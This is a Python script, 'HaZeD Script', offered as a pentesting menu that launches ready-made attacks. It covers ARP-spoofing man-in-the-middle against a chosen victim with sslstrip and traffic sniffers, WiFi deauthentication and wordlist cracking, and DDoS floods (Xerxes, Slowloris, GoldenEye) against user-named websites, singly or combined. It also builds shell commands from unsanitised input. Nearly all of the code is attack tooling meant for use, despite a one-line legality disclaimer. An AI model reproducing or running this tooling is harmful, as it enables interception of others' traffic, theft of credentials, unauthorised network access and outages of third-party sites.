import sys,os,time
import smtplib
from colorama import *
def logo():
	logo =""" ___ ___       _______       ______    ___ ___            __    __ 
|  Y   .---.-|   _   .-----|   _  \  |   Y   .-----.----|  .--|  |
|.  1   |  _  |___|   |  -__|.  |   \ |.  |   |  _  |   _|  |  _  |
|.  _   |___._|/  ___/|_____|.  |    \|. / \  |_____|__| |__|_____|
|:  |   |     |:  1  \      |:  1    /|:      |                    
|::.|:. |     |::.. . |     |::.. . / |::.|:. |                    
`--- ---'     `-------'     `------'  `--- ---'                    """

	print (Fore.BLUE + logo + Style.RESET_ALL)
	time.sleep(0.02)
	print (Fore.GREEN+" |+x+x+x+x+x+x+x+x+x+x+x+x+x+x+x+x+x+x+x+x+x+x+x+x| "+Style.RESET_ALL)
	time.sleep(0.02)
	print (Fore.RED+"             x|Welcome To HaZeD Script.|x              "+Style.RESET_ALL)
	time.sleep(0.02)
	print (Fore.RED+"              x|DONOT USE THIS ILLEGALY|x               "+Style.RESET_ALL)
	time.sleep(0.02)
	print (Fore.RED+"                x|xMade In 3/1/2018.x|x                 "+Style.RESET_ALL)
	time.sleep(0.02)
	print (Fore.RED+"                  x|Pentesting Tool.|x                  "+Style.RESET_ALL)
	time.sleep(0.02)
	print (Fore.RED+"                    x|Version 1.0|x                     "+Style.RESET_ALL)
	time.sleep(0.02)
	print (Fore.RED+"                      x|by HaZeD|x                      "+Style.RESET_ALL)
	time.sleep(0.02)
	print (Fore.GREEN+" |+x+x+x+x+x+x+x+x+x+x+x+x+x+x+x+x+x+x+x+x+x+x+x+x| "+Style.RESET_ALL)
ko=("/24")
ko2=("TCP")
pport=(" 80")
hh=("https://")
yn=(Fore.CYAN+"       (Y=For the whole network,N=OneTarget.)"+Style.RESET_ALL)
def clearo():
	os.system("clear")
def usr():
	clearo()
	logo()
	print (Fore.YELLOW+"						Hints"+Style.RESET_ALL)
	print (Fore.BLUE+" 1)"+Style.RESET_ALL+" Wifi attacks.                 "+Fore.CYAN+"(Sniffing packets and etc...)"+Style.RESET_ALL)
	print (Fore.BLUE+" 2)"+Style.RESET_ALL+" PortForwarding.               "+Fore.CYAN+"(Easy , without router admin password.)"+Style.RESET_ALL)
	print (Fore.BLUE+" 3)"+Style.RESET_ALL+" DDos attacks.       "+Fore.CYAN+"	    (It takes the server down.)"+Style.RESET_ALL)
	print (Fore.BLUE+" 4)"+Style.RESET_ALL+" Buy me a coffee."+Style.RESET_ALL)
	print (Fore.BLUE+" 0)"+Style.RESET_ALL+" Exit.")
	try:
		usr2 = raw_input(Fore.RED+"root@HaZeD"+Style.RESET_ALL+Fore.GREEN+":~ "+Style.RESET_ALL)
	except KeyboardInterrupt:
		clearo()
		print (Fore.GREEN+"Thank You For Choosing HaZeD Script."+Style.RESET_ALL)
		print (Fore.RED+"Exiting....."+Style.RESET_ALL)
		time.sleep(1.3)
		quit()
	if usr2 == ("1") :
		Three()
	elif usr2 == ("2") :
		Five()
	elif usr2 == ("3") :
		Six()
	elif usr2 == ("4") :
		Seven()
	elif usr2 == ("0") :
		quit()
	else :
		clearo()
		print (Fore.RED+"Please Choose From the list only."+Style.RESET_ALL)
		time.sleep(2)
		usr()
def One():
	try:
		os.system("xterm -hold -e 'sysctl -w net.ipv4.ip_forward=1"+"&& iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080"+"'")
		clearo()
		print ("Forwarding Packets"+Fore.GREEN+" ON!"+Style.RESET_ALL)
		time.sleep(1.3)
		Three()
	except KeyboardInterrupt:
		clearo()
		print (Fore.GREEN+"Thank You For Choosing HaZeD Script."+Style.RESET_ALL)
		print (Fore.RED+"Exiting....."+Style.RESET_ALL)
		time.sleep(1.3)
		quit()
def Two():
	try:
		os.system("xterm -e 'sysctl -w net.ipv4.ip_forward=0'")
		clearo()
		print ("Forwarding Packets"+Fore.RED+" OFF!"+Style.RESET_ALL)
		time.sleep(1.4)
		Three()
	except KeyboardInterrupt:
		clearo()
		print (Fore.GREEN+"Thank You For Choosing HaZeD Script."+Style.RESET_ALL)
		print (Fore.RED+"Exiting....."+Style.RESET_ALL)
		time.sleep(1.3)
		quit()
def Three():
	clearo()
	logo()
	print (Fore.YELLOW+"				     	Hints	"+Style.RESET_ALL)
	print (Fore.BLUE+"1)"+Style.RESET_ALL+" Enable Forwarding Packets.    "+Fore.CYAN+" (Recomended before starting the attack.)"+Style.RESET_ALL)
	print (Fore.BLUE+"2)"+Style.RESET_ALL+" Disable Forwarding Packets.    "+Fore.CYAN+"(Disable before quitting.)"+Style.RESET_ALL)
	print (Fore.BLUE+"3)"+Style.RESET_ALL+" MITM.     "+Fore.CYAN+"(ManInTheMiddleAttack with all tools (Powerfull,Easy).)"+Style.RESET_ALL)
	print (Fore.BLUE+"4)"+Style.RESET_ALL+" Crack a wifi with Aircrack-ng."+Fore.CYAN+"(Tries several passwords from a wordlist.)"+Style.RESET_ALL)
	print (Fore.BLUE+"99)"+Style.RESET_ALL+" Back to main menu.	"+Fore.CYAN+"	(Or Press <Enter>)"+Style.RESET_ALL)
	try:
		usr1 = raw_input(Fore.RED+"root@HaZeD"+Style.RESET_ALL+Fore.GREEN+":~ "+Style.RESET_ALL)
	except KeyboardInterrupt:
		clearo()
		print (Fore.GREEN+"Thank You For Choosing HaZeD Script."+Style.RESET_ALL)
		print (Fore.RED+"Exiting....."+Style.RESET_ALL)
		time.sleep(1.3)
		quit()
	if usr1 == ("1"):
		One()
	elif usr1 == ("2"):
		Two()
	elif usr1 == ("3"):
		Four()
	elif usr1 == ("4"):
		Eight()
	elif usr1 == ("99"):
		usr()
	else:
		clearo()
		print (Fore.RED+"Please Choose From the list only."+Style.RESET_ALL)
		time.sleep(2)
		usr()
def Four():
	try:
		os.system("nmap -sP "+gateway+ko)
	except:
		clearo()
		print (Fore.RED+"You have entered a wrong gateway when you entered the program!"+Style.RESET_ALL)
		time.sleep(1.5)
		Three()
	try:
		vic=raw_input(Fore.MAGENTA+"Enter the IP address of the victim: "+Style.RESET_ALL)
	except KeyboardInterrupt:
		clearo()
		print (Fore.GREEN+"Thank You For Choosing HaZeD Script."+Style.RESET_ALL)
		print (Fore.RED+"Exiting....."+Style.RESET_ALL)
		time.sleep(1.3)
		quit()
	try:
		os.system("xterm -e 'arpspoof -i "+interface+ " -t "+vic+" "+gateway+"'"+"|xterm -e 'arpspoof -i "+interface+ " -t "+gateway+" "+vic+"'"+"|xterm -e 'driftnet -i "+interface+"'"+"|xterm -e 'sslstrip -l 8080'"+"|xterm -e 'urlsnarf -i "+interface+"'")
	except KeyboardInterrupt:
		clearo()
		print (Fore.GREEN+"Thank You For Choosing HaZeD Script."+Style.RESET_ALL)
		print (Fore.RED+"Exiting....."+Style.RESET_ALL)
		time.sleep(1.3)
	Three()
def Five():
	clearo()
	logo()
	try:
		yourip=raw_input(Fore.MAGENTA+"Enter your Internel IP address: "+Style.RESET_ALL)
		yourport=raw_input(Fore.MAGENTA+"Enter the port you want to forward: "+Style.RESET_ALL)
	except KeyboardInterrupt:
		clearo()
		print (Fore.GREEN+"Thank You For Choosing HaZeD Script."+Style.RESET_ALL)
		print (Fore.RED+"Exiting....."+Style.RESET_ALL)
		time.sleep(1.3)
		quit()
	try:
		os.system("upnpc -a "+yourip +" " + yourport +" "+ yourport+" " + ko2)
		clearo()
		print (Fore.GREEN+"The port is forwarded successfully!"+Style.RESET_ALL)
		time.sleep(2)
		usr()
	except:
		os.system("xterm -e 'sudo apt-get install miniupnpc'")
		print (Fore.WHITE+"Needed Things are installed successfully."+Style.RESET_ALL)
		Five()
def Six():
	clearo()
	logo()
	print (Fore.YELLOW+"						Hints				"+Style.RESET_ALL)
	print (Fore.BLUE+"1)"+Style.RESET_ALL+"DDos attack with Xerxes."+Fore.CYAN+"   		(Most Powerfull Tool.)	"+Style.RESET_ALL)
	print (Fore.BLUE+"2)"+Style.RESET_ALL+"DDos attack with Slowloris."+Fore.CYAN+"   	(Powerfull Tool.)	"+Style.RESET_ALL)
	print (Fore.BLUE+"3)"+Style.RESET_ALL+"DDos attack with GoldenEye."+Fore.CYAN+"   	(You must copy the full URL.)	"+Style.RESET_ALL)
	print (Fore.BLUE+"4)"+Style.RESET_ALL+"DDos attack with ALL."+Fore.CYAN+"          (You will DDOS with all listed tools above.)"+Style.RESET_ALL)
	print (Fore.BLUE+"99)"+Style.RESET_ALL+" Back to main menu.	"+Fore.CYAN+"		(Or Press <Enter>)"+Style.RESET_ALL)
	try:
		usr3 = raw_input(Fore.RED+"root@HaZeD"+Style.RESET_ALL+Fore.GREEN+":~ "+Style.RESET_ALL)
	except KeyboardInterrupt:
		clearo()
		print (Fore.GREEN+"Thank You For Choosing HaZeD Script."+Style.RESET_ALL)
		print (Fore.RED+"Exiting....."+Style.RESET_ALL)
		time.sleep(1.3)
		quit()
	if usr3 == ("1"):
		try:
			atsite=raw_input(Fore.MAGENTA+"Enter the address of the site : "+Style.RESET_ALL)
		except KeyboardInterrupt:
			clearo()
			print (Fore.GREEN+"Thank You For Choosing HaZeD Script."+Style.RESET_ALL)
			print (Fore.RED+"Exiting....."+Style.RESET_ALL)
			time.sleep(1.3)
			quit()
		os.system("xterm -xrm 'XTerm.vt100.allowTitleOps: false' -T Attacking. -e 'cd Tools && ./xerxes "+atsite+pport+"'")
		Six()
	elif usr3 == ("2") :
		try:
			atsite=raw_input(Fore.MAGENTA+"Enter the address of the site : "+Style.RESET_ALL)
		except KeyboardInterrupt:
			clearo()
			print (Fore.GREEN+"Thank You For Choosing HaZeD Script."+Style.RESET_ALL)
			print (Fore.RED+"Exiting....."+Style.RESET_ALL)
			time.sleep(1.3)
			quit()
		os.system("xterm -xrm 'XTerm.vt100.allowTitleOps: false' -T Attacking. -e 'cd Tools && perl slowloris.pl -dns "+atsite+"'")
		Six()
	elif usr3 == ("3") :
		try:
			print (Fore.RED+"The URL Must contain 'http://' or 'https://' in the begining (Copy the Full URL from the search bar)"+Style.RESET_ALL)
			atsite=raw_input(Fore.MAGENTA+"Enter the address of the site : "+Style.RESET_ALL)
		except KeyboardInterrupt:
			clearo()
			print (Fore.GREEN+"Thank You For Choosing HaZeD Script."+Style.RESET_ALL)
			print (Fore.RED+"Exiting....."+Style.RESET_ALL)
			time.sleep(1.3)
			quit()
		os.system("xterm -xrm 'XTerm.vt100.allowTitleOps: false' -T Attacking. -e 'cd Tools/GoldenEye && ./goldeneye.py "+atsite+"'")
		Six()
	elif usr3 == ("4") :
		Ten()
	elif usr3 == ("99") :
		usr()
	else :
		clearo()
		print (Fore.RED+"Please Choose From the list only."+Style.RESET_ALL)
		time.sleep(2)
		usr()
def Seven():
	try:
		os.system("firefox --browser paypal.me/DBeack")
		usr()
	except:
		os.system("xterm -e 'sudo apt-get install firefox'")
		usr()
def Eight():
	clearo()
	logo()
	try:
		os.system("xterm -e 'airmon-ng start '"+interface)
	except:
		clearo()
		print (Fore.RED+"You have entered a wrong interface when you logged in to the program."+Sytle.RESET_ALL)
		time.sleep(2.3)
		Eight()
	try:
		os.system("gnome-terminal --geometry 100x45 -e 'airodump-ng '"+interface+"mon")
		clearo()
	except:
		clearo()
		print (Fore.RED+"You have entered a wrong interface when you logged in to the program."+Sytle.RESET_ALL)
		time.sleep(2.3)
		Eight()
	try:
		bssid=raw_input(Fore.MAGENTA+"Enter the BSSID of the wifi you want to attack: "+Style.RESET_ALL)
	except KeyboardInterrupt:
		clearo()
		print (Fore.GREEN+"Thank You For Choosing HaZeD Script."+Style.RESET_ALL)
		print (Fore.RED+"Exiting....."+Style.RESET_ALL)
		time.sleep(1.3)
		quit()
	try:
		channel=raw_input(Fore.MAGENTA+"Enter the Channel: "+Style.RESET_ALL)
	except KeyboardInterrupt:
		clearo()
		print (Fore.GREEN+"Thank You For Choosing HaZeD Script."+Style.RESET_ALL)
		print (Fore.RED+"Exiting....."+Style.RESET_ALL)
		time.sleep(1.3)
		quit()
	try:
		essid=raw_input(Fore.MAGENTA+"Enter the name of the wifi: "+Style.RESET_ALL)
	except KeyboardInterrupt:
		clearo()
		print (Fore.GREEN+"Thank You For Choosing HaZeD Script."+Style.RESET_ALL)
		print (Fore.RED+"Exiting....."+Style.RESET_ALL)
		time.sleep(1.3)
		quit()
	try:
		wordlist=raw_input(Fore.MAGENTA+"Enter the path of the wordlist: "+Style.RESET_ALL)
	except KeyboardInterrupt:
		clearo()
		print (Fore.GREEN+"Thank You For Choosing HaZeD Script."+Style.RESET_ALL)
		print (Fore.RED+"Exiting....."+Style.RESET_ALL)
		time.sleep(1.3)
		quit()
	try:
		os.system("xterm -hold -geometry 100x25 -e 'airodump-ng -c "+channel+" -w "+essid+" --bssid "+bssid + " " +interface+"mon'"+"|xterm  -hold -e 'aireplay-ng --deauth 10 -a "+bssid+" " +interface+"mon'")
	except:
		clearo()
		print (Fore.RED+"You have entered a wrong thing , please write it again carefully."+Style.RESET_ALL)
		time.sleep(2.5)
		Eight()
	try:
		os.system("aircrack-ng -w "+wordlist+" -b "+bssid+" "+essid+"-01.cap")
	except:
		clearo()
		print (Fore.RED+"You have entered a wrong thing , please write it again carefully."+Style.RESET_ALL)
		time.sleep(2.5)
		Eight()
def Ten():
	clearo()
	logo()
	try:
		print (Fore.MAGENTA+"Do you want : "+Style.RESET_ALL)
		print (Fore.YELLOW+"					HINTS"+Style.RESET_ALL)
		print (Fore.BLUE+"1)"+Style.RESET_ALL+"3 Tools attack on one site."+Fore.CYAN+"(3Tools will be loaded on one site.)"+Style.RESET_ALL)
		print (Fore.BLUE+"2)"+Style.RESET_ALL+"Different sites."+Fore.CYAN+"	(3Tools will be loaded on different site.)"+Style.RESET_ALL)
		print (Fore.BLUE+"99)"+Style.RESET_ALL+"Back to main menu."+Style.RESET_ALL)
		usr4 = raw_input(Fore.RED+"root@HaZeD"+Style.RESET_ALL+Fore.GREEN+":~ "+Style.RESET_ALL)
	except KeyboardInterrupt:
		clearo()
		print (Fore.GREEN+"Thank You For Choosing HaZeD Script."+Style.RESET_ALL)
		print (Fore.RED+"Exiting....."+Style.RESET_ALL)
		time.sleep(1.3)
		quit()
	if usr4 == ("1") :
		Eleven()
	elif usr4 == ("2") :
		Tewelve()
	elif usr4 == ("99") :
		Six()
	else :
		clearo()
		print (Fore.RED+"Please Choose From the list only."+Style.RESET_ALL)
		time.sleep(2)
		Ten()
def Eleven():
	clearo()
	logo()
	try:
		atsite=raw_input(Fore.MAGENTA+"Enter the address of the site : "+Style.RESET_ALL)
	except KeyboardInterrupt:
		clearo()
		print (Fore.GREEN+"Thank You For Choosing HaZeD Script."+Style.RESET_ALL)
		print (Fore.RED+"Exiting....."+Style.RESET_ALL)
		time.sleep(1.3)
		quit()
	os.system("xterm -geometry 100x25+0+0 -xrm 'XTerm.vt100.allowTitleOps: false' -T Attacking. -e 'cd Tools && ./xerxes "+atsite+pport+"'"+"|xterm -geometry 100x25-0+0 -xrm 'XTerm.vt100.allowTitleOps: false' -T Attacking. -e 'cd Tools && perl slowloris.pl -dns "+atsite+"'"+"|xterm -geometry 100x25-420-0 -xrm 'XTerm.vt100.allowTitleOps: false' -T Attacking. -e 'cd Tools/GoldenEye && ./goldeneye.py "+hh+atsite+"'")
	Ten()
def Tewelve():
	try:
		firstsite=raw_input(Fore.MAGENTA+"Enter the first site: "+Style.RESET_ALL)
	except KeyboardInterrupt:
		clearo()
		print (Fore.GREEN+"Thank You For Choosing HaZeD Script."+Style.RESET_ALL)
		print (Fore.RED+"Exiting....."+Style.RESET_ALL)
		time.sleep(1.3)
		quit()
	try:
		secondsite=raw_input(Fore.MAGENTA+"Enter the second site: "+Style.RESET_ALL)
	except KeyboardInterrupt:
		clearo()
		print (Fore.GREEN+"Thank You For Choosing HaZeD Script."+Style.RESET_ALL)
		print (Fore.RED+"Exiting....."+Style.RESET_ALL)
		time.sleep(1.3)
		quit()
	try:
		thirdsite=raw_input(Fore.MAGENTA+"Enter the third site: "+Style.RESET_ALL)
	except KeyboardInterrupt:
		clearo()
		print (Fore.GREEN+"Thank You For Choosing HaZeD Script."+Style.RESET_ALL)
		print (Fore.RED+"Exiting....."+Style.RESET_ALL)
		time.sleep(1.3)
		quit()
	os.system("xterm -geometry 100x25+0+0 -xrm 'XTerm.vt100.allowTitleOps: false' -T Attacking. -e 'cd Tools && ./xerxes "+firstsite+pport+"'"+"|xterm -geometry 100x25-0+0 -xrm 'XTerm.vt100.allowTitleOps: false' -T Attacking. -e 'cd Tools && perl slowloris.pl -dns "+secondsite+"'"+"|xterm -geometry 100x25-420-0 -xrm 'XTerm.vt100.allowTitleOps: false' -T Attacking. -e 'cd Tools/GoldenEye && ./goldeneye.py "+hh+thirdsite+"'")
	Ten()
def Download():
	os.system("xterm -e 'rmdir /root/HaZeDScript")
	os.system("cd /root && git clone https://github.com/drollbeack18100/HaZeDScript")
	usr()
clearo()
logo()
print ("Verfying some information.")
try:
	interface=raw_input(Fore.MAGENTA+"Enter your interface: "+Style.RESET_ALL)
	gateway=raw_input(Fore.MAGENTA+"Enter your gateway: "+Style.RESET_ALL)
except KeyboardInterrupt:
	clearo()
	logo()
	print (Fore.GREEN+"Thank You For Choosing HaZeD Script."+Style.RESET_ALL)
	print (Fore.RED+"Exiting....."+Style.RESET_ALL)
	time.sleep(1.3)
	quit()
clearo()
logo()
print (Fore.YELLOW+"						Hints"+Style.RESET_ALL)
print (Fore.BLUE+" 1)"+Style.RESET_ALL+" Wifi attacks.                 "+Fore.CYAN+"(Sniffing packets and etc...)"+Style.RESET_ALL)
print (Fore.BLUE+" 2)"+Style.RESET_ALL+" PortForwarding.               "+Fore.CYAN+"(Easy , without router admin password.)"+Style.RESET_ALL)
print (Fore.BLUE+" 3)"+Style.RESET_ALL+" DDos attacks.       "+Fore.CYAN+"	    (It takes the server down.)"+Style.RESET_ALL)
print (Fore.BLUE+" 4)"+Style.RESET_ALL+" Buy me a coffee."+Style.RESET_ALL)
print (Fore.BLUE+" 0)"+Style.RESET_ALL+" Exit.")
try:
	usr2 = raw_input(Fore.RED+"root@HaZeD"+Style.RESET_ALL+Fore.GREEN+":~ "+Style.RESET_ALL)
except KeyboardInterrupt:
	clearo()
	print (Fore.GREEN+"Thank You For Choosing HaZeD Script."+Style.RESET_ALL)
	print (Fore.RED+"Exiting....."+Style.RESET_ALL)
	time.sleep(1.3)
	quit()
if usr2 == ("1") :
	Three()
elif usr2 == ("2") :
	Five()
elif usr2 == ("3") :
	Six()
elif usr2 == ("4") :
	Seven()
elif usr2 == ("0") :
	quit()
else :
	clearo()
	print (Fore.RED+"Please Choose From the list only."+Style.RESET_ALL)
	time.sleep(2)
	usr()
